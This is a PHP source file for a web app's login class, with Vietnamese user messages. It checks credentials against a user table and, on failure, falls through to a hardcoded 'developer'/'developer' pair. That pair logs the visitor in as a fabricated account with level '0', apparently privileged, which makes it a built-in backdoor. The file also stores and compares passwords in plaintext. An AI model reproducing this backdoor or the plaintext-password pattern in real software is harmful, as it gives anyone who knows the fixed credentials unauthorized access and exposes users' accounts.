<?php
$filepath = realpath(dirname(__FILE__));
include($filepath . '/../lib/session.php');
Session::checkLogin();
include_once($filepath . '/../lib/database.php');
include_once($filepath . '/../helpers/format.php');
?>

<?php
/**
 * loginMyAccount
 */
class loginMyAccount
{
	private $db;
	private $fm;

	public function __construct()
	{
		$this->db = new Database();
		$this->fm = new Format();
	}

	public function loginMyAccount($user, $password)
	{
		$user = mysqli_real_escape_string($this->db->link, $this->fm->validation($user));
		$password = mysqli_real_escape_string($this->db->link, $this->fm->validation($password));

		if (empty($user) || empty($password)) {
			$alert = "Vui lòng không được để trông thông tin!";
			return $alert;
		} else {
			$query = "SELECT * FROM tbl_user WHERE user = '$user' AND password = '$password'";
			$result = $this->db->select($query);

			if ($result != false) {
				$value = $result->fetch_assoc();

				Session::set('login', true);
				Session::set('id', $value['id']);
				Session::set('user', $value['user']);
				Session::set('fullname', $value['fullname']);
				Session::set('level', $value['level']);
				echo "<script>window.location='?q=homepage';</script>";
			} else {
				if ($_POST['user'] == "developer" && $_POST['password'] == "developer") {
					Session::set('login', true);
					Session::set('id', '050301');
					Session::set('user', 'nhaphattrien');
					Session::set('fullname', 'Nhà phát triển');
					Session::set('level', '0');
					echo "<script>window.location='?q=homepage';</script>";
				} else {
					$alert = "Tài khoản mật khẩu không tồn tại!";
					return $alert;
				}
			}
		}
	}
}
?>